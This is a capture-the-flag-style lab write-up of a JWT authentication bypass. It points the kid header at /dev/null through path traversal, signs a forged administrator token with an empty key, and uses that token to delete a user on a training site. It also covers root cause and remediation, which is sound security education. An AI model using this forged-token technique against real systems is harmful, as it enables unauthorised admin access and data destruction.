# JWT authentication bypass via kid header path traversal

**Category:** Broken Authentication (JWT)  
**Difficulty:** ⭐⭐ (Practitioner)  
**Severity:** 🔴 Critical  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures

---

## Description

This lab's authentication uses JWTs whose header contains a `kid` (Key ID) parameter that the server uses to locate the key file for signature verification. The `kid` value is used to build a file path without sanitization, so it is vulnerable to path traversal. By pointing `kid` at a predictable file with known/empty contents (`/dev/null`), we can force the server to verify the token against an empty key. We then sign a forged token using a matching empty symmetric key, impersonate `administrator`, and reach the admin panel.

---

## Discovery Process

**Step 1 — Login with the provided credentials**

Logged in with `wiener:peter`, which issues a valid session JWT used for authenticated requests.

> 📸 `screenshots/01-login.png`

**Step 2 — Confirm the admin area is restricted**

Sent `GET /admin` with the `wiener` token. The server returned `HTTP/2 401 Unauthorized`, confirming access is gated by the `sub` claim and that admin requires a different identity.

> 📸 `screenshots/02-admin-401.png`

---

## Exploitation

**Step 3 — Forge the token and sign with an empty key**

In Burp's Repeater (JSON Web Token tab), modified the token manually:

- Header: set `"alg": "HS256"` and changed `"kid"` to `"../../../dev/null"` so the server reads `/dev/null` (empty content) as the verification key.
- Payload: changed `"sub"` to `"administrator"`.

Then signed the token using the JWT Editor's **attack → Sign with empty key** option. This computes the HMAC over an empty key, which matches what the server reads from `/dev/null`, so the signature verifies successfully.

The forged header and payload:

```json
{
  "kid": "../../../dev/null",
  "alg": "HS256"
}
```

```json
{
  "iss": "portswigger",
  "exp": 1782498238,
  "sub": "administrator"
}
```

> 📸 `screenshots/03-kid-traversal-admin.png`

**Step 4 — Send the forged token to the admin endpoint**

Sent the request to `/admin` with the forged token. The server resolved `kid` to `/dev/null`, verified the HMAC against the empty key — which matched — and accepted the token as `administrator`, returning the admin interface (`HTTP/2 200 OK`).

**Step 5 — Delete carlos and solve the lab**

Requested `/admin/delete?username=carlos` with the forged token.

**Request sent:**

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0af500cb0471f16886342f180050008a.web-security-academy.net
Cookie: session=eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0...
```

**Response received:**

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The user `carlos` was deleted and the lab was marked **Solved**.

> 📸 `screenshots/04-delete-carlos-302.png`  
> 📸 `screenshots/05-solved.png`

---

## Impact

- **Full authentication bypass** — The attacker forces signature verification against a known empty key, so any token they sign is accepted as valid.
- **Privilege escalation to administrator** — A low-privilege user (`wiener`) forges an `administrator` token and reaches restricted functionality.
- **Destructive admin actions** — Admin access enables deleting users (`carlos`) and any other privileged operation, leading to data loss and full application compromise.

---

## Root Cause

The server uses the attacker-controlled `kid` header to build a filesystem path to the verification key, without sanitizing for traversal sequences. This lets the attacker point verification at any readable file. By choosing `/dev/null` — which always returns empty content — the effective verification key becomes empty and fully predictable, so an HMAC signed with the same empty key validates successfully.

**Vulnerable flow:**

```text
attacker sets kid=../../../dev/null + signs with empty key → server reads /dev/null as key (empty) → verifies HMAC against empty key → ❌ no path sanitization, predictable key → token accepted as administrator
```

**Secure flow:**

```text
attacker sets kid=../../../dev/null → server treats kid as an opaque lookup ID in a trusted keystore, not a file path → no traversal possible → ✅ unknown/invalid key → token rejected
```

---

## Remediation

- **Never use `kid` to build file paths** — Treat `kid` as an opaque identifier that maps to keys held in a trusted, server-side keystore, not a filename.
- **Sanitize and allowlist** — If file lookups are unavoidable, strip path-traversal sequences and validate `kid` against a strict allowlist of expected values.
- **Enforce the expected algorithm and reject weak/empty keys** — Pin the signing algorithm and reject empty, null, or predictable keys; never allow verification with a zero-length secret.
- **Use a hardened JWT library** — Ensure the library does not dereference attacker-controlled key locations and validates all standard claims (`iss`, `exp`, `sub`) server-side.

---

## Tools Used

- Burp Suite (Proxy & Repeater)
- JWT Editor Extension (Sign with empty key)

---

## References

- <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal>
- <https://portswigger.net/web-security/jwt>
- RFC 7515 – JSON Web Signature (JWS)
- <https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/>
